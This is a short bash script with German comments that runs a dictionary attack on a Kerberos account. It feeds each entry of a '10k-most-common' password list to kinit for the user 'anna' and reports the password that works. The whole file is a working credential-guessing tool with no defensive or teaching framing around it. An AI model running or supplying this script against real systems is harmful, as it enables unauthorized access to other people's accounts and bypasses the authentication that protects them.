#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    echo "$password" | kinit "$username" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        exit 0
    fi
}

# Lesen Sie jedes Passwort aus der Liste und versuchen Sie, sich anzumelden
while IFS= read -r password; do
    check_password "$password"
done < "$password_list_path"

# Wenn kein gültiges Passwort gefunden wurde
echo "Kein gültiges Passwort für '$username' gefunden."
exit 1
